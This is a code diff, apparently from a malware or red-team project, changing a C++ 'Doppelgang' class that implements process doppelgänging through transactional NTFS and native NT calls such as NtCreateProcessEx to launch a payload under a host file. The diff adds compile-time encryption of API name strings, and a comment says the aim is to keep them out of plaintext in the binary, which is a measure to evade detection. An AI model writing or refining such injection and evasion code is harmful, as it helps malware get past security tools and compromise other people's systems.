@@ -20,19 +20,21 @@ static HMODULE hNtdll  = NULL;
 static HMODULE hKtmW32 = NULL;
 
 static void LoadApis() {
-    if (!hNtdll)  hNtdll  = GetModuleHandleA("ntdll.dll");
-    if (!hKtmW32) hKtmW32 = LoadLibraryA("KtmW32.dll");
+    if (!hNtdll)  hNtdll  = GetModuleHandleA(S("ntdll.dll").c_str());
+    if (!hKtmW32) hKtmW32 = LoadLibraryA(S("KtmW32.dll").c_str());
 }
 
+// S(#name) encrypts the NT API name at compile time so the string
+// "NtCreateProcessEx" etc. does not appear in plaintext in the binary.
 #define NTAPI_PROC(type, name) \
     static type _##name = NULL; \
-    if(!_##name) _##name = (type)GetProcAddress(hNtdll, #name)
+    if(!_##name) _##name = (type)GetProcAddress(hNtdll, S(#name).c_str())
 
 bool Doppelgang::IsTxFAvailable() {
     LoadApis();
     if (!hKtmW32) return false;
-    HMODULE hK32 = GetModuleHandleA("kernel32.dll");
-    auto fn = GetProcAddress(hK32, "CreateFileTransactedA");
+    HMODULE hK32 = GetModuleHandleA(S("kernel32.dll").c_str());
+    auto fn = GetProcAddress(hK32, S("CreateFileTransactedA").c_str());
     return fn != NULL;
 }
 
@@ -66,7 +68,7 @@ DWORD Doppelgang::Spawn(const char* hostPath, const char* payloadPath) {
     if (!IsTxFAvailable())
         return 0;
 
-    HMODULE hK32 = GetModuleHandleA("kernel32.dll");
+    HMODULE hK32 = GetModuleHandleA(S("kernel32.dll").c_str());
 
     NTAPI_PROC(pNtCreateTransaction,    NtCreateTransaction);
     NTAPI_PROC(pNtRollbackTransaction,  NtRollbackTransaction);
@@ -77,7 +79,7 @@ DWORD Doppelgang::Spawn(const char* hostPath, const char* payloadPath) {
     NTAPI_PROC(pNtQueryInformationProcess, NtQueryInformationProcess);
 
     auto _CreateFileTransactedA =
-        (pCreateFileTransactedA)GetProcAddress(hK32, "CreateFileTransactedA");
+        (pCreateFileTransactedA)GetProcAddress(hK32, S("CreateFileTransactedA").c_str());
 
     if (!_NtCreateTransaction || !_NtRollbackTransaction ||
         !_NtCreateSection     || !_NtCreateProcessEx    ||
